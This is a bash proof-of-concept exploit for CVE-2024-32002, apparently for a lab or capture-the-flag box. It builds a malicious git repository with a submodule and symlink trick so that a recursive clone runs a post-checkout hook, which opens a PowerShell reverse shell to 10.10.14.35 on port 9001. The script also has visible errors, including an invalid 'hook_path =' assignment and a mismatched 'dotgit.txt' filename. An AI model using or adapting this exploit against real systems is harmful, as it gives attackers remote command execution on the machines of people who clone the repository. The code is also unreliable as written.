#!/bin/bash

# Inspired by https://github.com/amalmurali47/git_rce/tree/main
# This exploits the CVE-2024-32002 vulnerability in the gitlab-shell

git config --global protocol.file.allow

# I want a reverse shell instead of calc.exe hence this is a bash reverse shell

git config --global core.symlinks true
git config --global init.defaultBranch main

tell_tale_path="$PWD/tell_tale.txt"

git init hook
cd hook
mkdir -p y/hooks

cat > y/hooks/post-checkout <<EOF
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.35',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
EOF

chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout
git commit -m "Add post-checkout hook"

cd ..

hook_path = "$(pwd)/hook"

git init captain 
cd captain
git submodule add --name x/y "$hook_path" X/modules/z
git commit -m "Add submodule"

printf ".git" > $tell_tale_path
git hash-object -w --stdin <dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
cd ..

git clone --recursive captain hooked